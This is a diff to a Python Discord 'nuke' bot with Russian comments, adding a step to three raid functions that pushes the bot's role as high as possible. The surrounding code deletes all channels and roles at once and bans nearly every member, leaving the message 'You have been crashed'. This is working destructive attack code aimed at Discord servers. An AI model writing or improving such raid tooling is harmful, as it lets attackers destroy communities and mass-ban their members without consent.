@@ -312,8 +312,17 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
         spam_text = config.SPAM_TEXT
 
     NUKE_NAME = "Вы были крашнуты"
-
     bot_role = guild.me.top_role
+
+    # ── 0. Пробуем поднять роль бота как можно выше ──
+    try:
+        max_pos = max((r.position for r in guild.roles), default=1)
+        if bot_role.position < max_pos - 1:
+            await bot_role.edit(position=max_pos - 1)
+            bot_role = guild.me.top_role  # обновляем
+    except Exception:
+        pass
+
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
@@ -377,18 +386,26 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     if starter_id:
         PROTECTED_IDS.add(starter_id)
 
+    # ── 0. Поднимаем роль бота как можно выше ──
+    try:
+        max_pos = max((r.position for r in guild.roles), default=1)
+        if bot_role.position < max_pos - 1:
+            await bot_role.edit(position=max_pos - 1)
+            bot_role = guild.me.top_role
+    except Exception:
+        pass
+
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
-    # ── 1. Сначала удаляем роли и каналы параллельно ──
-    # Удаление ролей снимает защиту с участников → потом можно банить всех
+    # ── 1. Удаляем роли и каналы параллельно ──
     await asyncio.gather(
         *[c.delete() for c in channels_to_delete],
         *[r.delete() for r in roles_to_delete],
         return_exceptions=True
     )
 
-    # ── 2. Теперь баним всех (роли уже удалены — нет защиты) + создаём каналы параллельно ──
+    # ── 2. Баним всех (роли удалены) + создаём каналы параллельно ──
     candidates = [
         m for m in guild.members
         if not m.bot and m.id != guild.owner_id and m.id not in PROTECTED_IDS
@@ -446,18 +463,26 @@ async def do_owner_nuke_task(guild, spam_text=None):
     OWNER_NAME = "Вы были крашнуты"
     bot_role = guild.me.top_role
 
+    # ── 0. Поднимаем роль бота как можно выше ──
+    try:
+        max_pos = max((r.position for r in guild.roles), default=1)
+        if bot_role.position < max_pos - 1:
+            await bot_role.edit(position=max_pos - 1)
+            bot_role = guild.me.top_role
+    except Exception:
+        pass
+
     channels_to_delete = list(guild.channels)
     roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
     # ── 1. Удаляем роли и каналы параллельно ──
-    # Роли удаляются первыми — снимают защиту со всех участников
     await asyncio.gather(
         *[c.delete() for c in channels_to_delete],
         *[r.delete() for r in roles_to_delete],
         return_exceptions=True
     )
 
-    # ── 2. Баним ВСЕХ (роли уже удалены) + создаём каналы параллельно ──
+    # ── 2. Баним ВСЕХ (роли удалены) + создаём каналы параллельно ──
     targets = [
         m for m in guild.members
         if not m.bot and m.id != guild.owner_id
